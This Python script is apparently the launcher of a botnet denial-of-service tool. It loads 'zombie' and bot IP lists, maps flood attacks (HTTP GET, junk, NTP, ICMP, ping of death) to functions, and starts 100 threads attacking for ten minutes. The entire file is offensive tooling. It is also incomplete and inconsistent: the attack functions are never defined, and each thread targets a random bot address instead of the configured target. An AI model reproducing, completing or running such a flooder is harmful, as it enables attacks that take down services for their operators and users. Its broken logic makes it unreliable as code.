import socket
import threading
import time
import random
import cloudscraper
import requests
import struct
import os
import sys
import socks
import ssl
from struct import pack as data_pack
from multiprocessing import Process
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4
from icmplib import ping as pig
from scapy.layers.inet import UDP

def read_ips_from_file(file_path):
    with open(file_path, 'r') as file:
        ips = [line.strip() for line in file]
    return ips

def main():
    # Read zombies from zombies.txt
    zombies = read_ips_from_file('zombies.txt')

    # Read bots from 50kbots.txt
    bots = read_ips_from_file('50kbots.txt')

    # Combine zombies and bots into a single list
    targets = zombies + bots

    # Define your payloads here
    payloads = {
        'http_get': attack_http_get,
        'junk': attack_junk,
        'ntp': attack_ntp,
        'icmp': attack_icmp,
        'pod': attack_pod
    }

    # Define your attack parameters here
    target = 'http://example.com'
    times = 600  # Duration of the attack in seconds
    threads = 100  # Number of threads to use for the attack
    attack_type = 'http_get'  # Type of attack to perform

    # Run the attack
    if attack_type in payloads:
        payload = payloads[attack_type]
        for _ in range(threads):
            t = threading.Thread(target=payload, args=(random.choice(targets), times))
            t.start()
    else:
        print(f"Invalid attack type: {attack_type}")

if __name__ == '__main__':
    main()